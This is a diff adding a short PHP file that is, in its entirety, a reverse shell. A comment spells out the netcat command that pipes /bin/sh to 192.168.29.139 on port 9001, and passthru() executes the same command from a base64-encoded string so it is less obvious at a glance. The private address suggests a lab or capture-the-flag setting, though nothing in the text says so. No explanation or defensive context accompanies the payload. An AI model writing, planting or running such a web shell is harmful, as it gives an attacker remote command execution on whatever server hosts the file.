@@ -1,0 +1,4 @@
+<?php
+#nc -e /bin/sh 192.168.29.139 9001
+passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjI5LjEzOSA5MDAx'));
+?>
